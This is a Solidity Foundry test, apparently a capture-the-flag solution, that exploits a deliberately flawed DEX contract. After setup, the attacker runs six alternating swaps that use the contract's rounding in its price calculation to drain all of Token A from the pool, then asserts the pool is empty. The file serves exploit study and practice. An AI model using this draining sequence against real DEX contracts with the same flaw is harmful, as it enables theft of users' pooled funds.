// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Swap.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTest is Test {
    SwappableToken public swappabletokenA;
    SwappableToken public swappabletokenB;
    Dex public dex;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!
    function setUp() public {
        dex = new Dex();
        swappabletokenA = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dex.setTokens(address(swappabletokenA), address(swappabletokenB));

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletokenA), 100);
        dex.addLiquidity(address(swappabletokenB), 100);

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
        vm.label(attacker, "Attacker");
    }

    function testExploit() public {
    vm.startPrank(attacker);
    
    // Approve DEX to spend tokens
    swappabletokenA.approve(address(dex), type(uint256).max);
    swappabletokenB.approve(address(dex), type(uint256).max);

    // Initial balances
    console.log("Initial DEX Token A balance:", swappabletokenA.balanceOf(address(dex)));
    console.log("Initial DEX Token B balance:", swappabletokenB.balanceOf(address(dex)));
    console.log("Initial Attacker Token A balance:", swappabletokenA.balanceOf(attacker));
    console.log("Initial Attacker Token B balance:", swappabletokenB.balanceOf(attacker));

    // Perform swaps to drain Token A
    dex.swap(address(swappabletokenA), address(swappabletokenB), 10);
    dex.swap(address(swappabletokenB), address(swappabletokenA), 20);
    dex.swap(address(swappabletokenA), address(swappabletokenB), 24);
    dex.swap(address(swappabletokenB), address(swappabletokenA), 30);
    dex.swap(address(swappabletokenA), address(swappabletokenB), 41);
    dex.swap(address(swappabletokenB), address(swappabletokenA), 45);

    // Final balances
    console.log("Final DEX Token A balance:", swappabletokenA.balanceOf(address(dex)));
    console.log("Final DEX Token B balance:", swappabletokenB.balanceOf(address(dex)));
    console.log("Final Attacker Token A balance:", swappabletokenA.balanceOf(attacker));
    console.log("Final Attacker Token B balance:", swappabletokenB.balanceOf(attacker));

    // Assert that Token A has been drained from DEX
    assertEq(swappabletokenA.balanceOf(address(dex)), 0);
    
    vm.stopPrank();
}


    

}
